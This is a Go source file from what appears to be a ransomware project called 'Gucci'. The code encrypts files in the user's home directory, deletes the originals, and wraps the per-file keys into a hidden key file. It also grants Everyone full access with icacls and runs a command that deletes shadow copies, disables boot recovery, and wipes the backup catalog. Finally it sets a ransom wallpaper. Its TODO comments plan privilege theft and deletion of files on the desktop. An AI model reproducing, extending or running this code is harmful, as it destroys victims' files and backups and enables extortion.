package crypto

import (
	"bufio"
	"os"
	"os/exec"
	"strings"
	"log"
	"unsafe"
	"syscall"
	"path/filepath"
	"encoding/base64"
	"io/ioutil"
	"runtime/debug"
	"runtime"
	"gucci/encryptor/assets"
	"gucci/encryptor/keys"
	"gucci/encryptor/sencryptor"
	"gucci/encryptor/asencryptor"
	"gucci/encryptor/environment"
)

const (
	spiSetDeskWallpaper = 0x0014
	uiParam = 0x0000
	spifUpdateINIFile = 0x01
	spifSendChange    = 0x02
)

var (
	user32 = syscall.NewLazyDLL("user32.dll")
	systemParametersInfo = user32.NewProc("SystemParametersInfoW")
	home, err = os.UserHomeDir()
	desktop = filepath.Join(home, "Desktop")
	pictures = filepath.Join(home, "Pictures")
	cwd = filepath.Join(home, ".Gucci")
	testPath = filepath.Join(home, "tests")
)

func Lock() {
	os.MkdirAll(cwd, 0644) // TODO: Remove this dropper has it anyway
	cmd := exec.Command("cmd.exe", "/c", "attrib +h")
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	cmd = exec.Command("cmd.exe", "/c", "icacls . /grant Everyone:F /T /C /Q")
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	files := environment.Files(testPath)

	if len(files) == 0 {
		return
	}

	keyAndFilepath := startEncryption(files)
	var encryptedKeyandFilepath [][]string

	for _, kf := range keyAndFilepath {
		AESKey := kf[0]
		encryptedFilepath := kf[1]

		encryptedKey := asencryptor.Encrypt(AESKey, filepath.Join(cwd, "k.gucci"))
		encKey := base64.StdEncoding.EncodeToString(encryptedKey)
		encFile := base64.StdEncoding.EncodeToString([]byte(encryptedFilepath))

		encKeyandFilepath := [][]string{{encKey, encFile}}
		encryptedKeyandFilepath = append(encryptedKeyandFilepath, encKeyandFilepath...)
	}

	for _, ekf := range encryptedKeyandFilepath {
		line := ekf[0] + "   " + ekf[1] + "\n"
		f, err := os.OpenFile(filepath.Join(cwd, "f.gucci"), os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			f, err = os.Create(filepath.Join(cwd, "f.gucci"))
			if err != nil {
				log.Fatal(err)
			}

			_, err := f.Write([]byte(line))
			if err != nil {
				f.Close()
				log.Fatal(err)
			}
			f.Close()
		} else {
			_, err := f.Write([]byte(line))
			if err != nil {
				f.Close()
				log.Fatal(err)
			}

			f.Close()
		}
	}

	w := 0
	// TODO: Try to steal administrator privileges
	cmd = exec.Command("cmd.exe", "/c", "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog –quiet")
	if err := cmd.Run(); err != nil {
		changeWallpaper()
		w = 1
	}

	if w == 0 {
		changeWallpaper()
	}

	// TODO: Delete files in desktop path and run decrypter program
}

func startEncryption(files []string) [][]string{
	var keyAndFilepath [][]string
	for _, file := range files {
		key := keys.GenerateRandomBytes(24)

		f, err := os.Open(file)
		if err != nil {
			log.Fatal(err)
		}

		reader := bufio.NewReader(f)
		//stat, err := os.Stat(file)
		data := make([]byte, 3000024)
		newFile := file + ".gucci"

		for {
			count, err := reader.Read(data)
			if err != nil {
				if strings.Contains(err.Error(), "EOF") {
					break
				}
				log.Fatal(err)
			}

			f, err := os.OpenFile(newFile, os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				f, err = os.Create(newFile)
				if err != nil {
					log.Fatal(err)
				}

				_, err := f.Write(sencryptor.Encrypt(data[:count], key))
				if err != nil {
					f.Close()
					log.Fatal(err)
				}
				f.Close()
			} else {
				_, err := f.Write(sencryptor.Encrypt(data[:count], key))
				if err != nil {
					f.Close()
					log.Fatal(err)
				}

				f.Close()
			}
		}

		if err = f.Close(); err != nil {
			log.Fatal(err)
		}

		//TODO: Is a file failed to remove, save it in a list and remove it later
		err = os.Remove(file)
		if err != nil {
			log.Fatal(err)
		}

		fileKey := [][]string{{string(key), newFile}}
		keyAndFilepath = append(keyAndFilepath, fileKey...)

		//free memory
		debug.FreeOSMemory()
		runtime.GC()
	}

	return keyAndFilepath
}

func changeWallpaper() {
	content, err := base64.StdEncoding.DecodeString(assets.IMG)
	if err != nil {
		log.Fatal(err)
	}

	err = ioutil.WriteFile(filepath.Join(pictures, "gucci.png"), []byte(content), 0644)
	if err != nil {
		log.Fatal(err)
	}

	filenameUTF16, err := syscall.UTF16PtrFromString(filepath.Join(pictures, "gucci.png"))
	if err != nil {
		log.Fatal(err)
	}

	systemParametersInfo.Call(
		uintptr(spiSetDeskWallpaper),
		uintptr(uiParam),
		uintptr(unsafe.Pointer(filenameUTF16)),
		uintptr(spifUpdateINIFile|spifSendChange),
	)
}
